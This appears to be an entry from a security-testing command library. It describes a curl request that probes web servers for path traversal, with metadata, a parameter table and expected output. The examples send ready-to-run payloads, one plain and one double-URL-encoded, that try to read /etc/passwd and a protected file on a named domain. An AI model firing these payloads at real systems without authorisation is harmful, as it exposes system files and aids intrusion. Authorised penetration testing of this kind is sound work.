---
data: 'curl -X GET "https://target.com/path?file=../../../test" -v'
tags:
  - web-testing
  - path-traversal
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:44.963Z'
id: 63cecfab-9dea-4cb6-a7af-f47cb49d996e
verified: false
validated: true
submitted: true
---
# curl-path-traversal-test

## Command

```bash
curl -X GET "https://target.com/path?file=../../../test" -v
```

## Description

This command uses curl to send an HTTP GET request with a path traversal payload in the query parameter, testing if the server resolves directories outside the intended root. Customize the URL, parameter name, and traversal sequence for the target.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| `URL` | Target endpoint with traversal in param (e.g., ?file=../../../etc/passwd) | Yes |
| `-v` | Verbose output to inspect headers and responses | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://uberinternal.com/path?file=../../../etc/passwd" -v
```

### Advanced Usage

```bash
curl -X GET "https://uberinternal.com/path?file=%252e%252e%252f%252e%252e%252fprotected/file" -o output.txt -v
```

## Expected Output

Successful traversal returns file contents or directory info in the response body; failures show 404, 403, or sanitized errors. Verbose mode reveals path resolution hints in headers.

## Related

- [[Related Procedure]]
